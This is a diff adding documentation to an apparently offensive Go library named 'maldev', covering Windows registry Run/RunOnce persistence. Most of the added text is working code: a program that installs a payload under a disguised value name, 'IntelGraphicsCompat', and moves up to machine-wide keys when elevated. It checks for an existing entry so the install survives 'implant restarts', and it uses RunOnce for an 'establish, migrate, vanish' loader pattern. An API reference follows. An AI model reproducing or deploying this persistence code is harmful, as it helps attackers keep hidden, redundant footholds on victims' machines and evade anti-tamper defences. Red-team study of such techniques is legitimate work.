@@ -121,6 +121,96 @@ no SCM).
 
 ---
 
+## Advanced — RunOnce, HKLM, and conditional install
+
+`KeyRunOnce` self-deletes after first execution — useful for staged
+loaders that establish a more durable persistence on first boot then
+clean up the noisy registry trail. Combine with an `Exists` probe to
+make installation idempotent across implant restarts:
+
+```go
+package main
+
+import (
+	"fmt"
+	"log"
+	"os"
+
+	"github.com/oioio-space/maldev/persistence/registry"
+	"github.com/oioio-space/maldev/win/privilege"
+)
+
+func main() {
+	const (
+		valueName = "IntelGraphicsCompat"
+		payload   = `C:\Users\Public\Intel\stage1.exe`
+	)
+
+	// Pick the hive based on integrity level — admin + elevated gets HKLM
+	// (machine-wide); anything else falls back to HKCU.
+	hive := registry.HiveCurrentUser
+	if admin, elevated, _ := privilege.IsAdmin(); admin && elevated {
+		hive = registry.HiveLocalMachine
+	}
+
+	// Idempotency: skip if already installed.
+	if exists, _ := registry.Exists(hive, registry.KeyRun, valueName); exists {
+		fmt.Println("already installed; skipping")
+		return
+	}
+
+	if _, err := os.Stat(payload); err != nil {
+		log.Fatalf("payload missing at %s: %v", payload, err)
+	}
+	if err := registry.Set(hive, registry.KeyRun, valueName, payload); err != nil {
+		log.Fatal(err)
+	}
+
+	// One-shot RunOnce that self-deletes after first boot — useful for
+	// "establish, migrate, vanish" pattern.
+	_ = registry.Set(hive, registry.KeyRunOnce, valueName+"_bootstrap", payload+" --bootstrap")
+}
+```
+
+`Mechanism` interface composition (see [persistence overview](../../persistence.md))
+lets you install several persistence mechanisms in one `InstallAll`
+call — useful for redundancy when the host's anti-tamper service may
+disable any single one.
+
 ## API Reference
 
-See [persistence.md](../../persistence.md#persistenceregistry----registry-runrunonce-keys)
+```go
+// Hive selects HKCU vs HKLM (HKLM requires admin).
+type Hive int
+const (
+    HiveCurrentUser Hive = iota
+    HiveLocalMachine
+)
+
+// KeyKind selects Run (persistent) vs RunOnce (deletes after firing).
+type KeyKind int
+const (
+    KeyRun KeyKind = iota
+    KeyRunOnce
+)
+
+// Set writes valueName=payloadCmd under hive\<key>. Creates the key if
+// missing. Overwrites an existing value. Errors out on access denied
+// (HKLM without admin) or RegOpenKeyEx failure.
+func Set(hive Hive, key KeyKind, valueName, payloadCmd string) error
+
+// Exists is a cheap probe — returns (false, nil) if the value is absent.
+func Exists(hive Hive, key KeyKind, valueName string) (bool, error)
+
+// Delete removes valueName. Returns nil even if the value was already absent.
+func Delete(hive Hive, key KeyKind, valueName string) error
+
+// RunKey wraps Set/Exists/Delete in a Mechanism so the caller can chain
+// it alongside startup-folder, scheduled-task, and service mechanisms
+// via persistence.InstallAll(...).
+func RunKey(hive Hive, key KeyKind, name, cmd string) Mechanism
+```
+
+The full `Mechanism` interface and the higher-level `InstallAll` /
+`UninstallAll` orchestrators live in
+[`docs/persistence.md`](../../persistence.md).
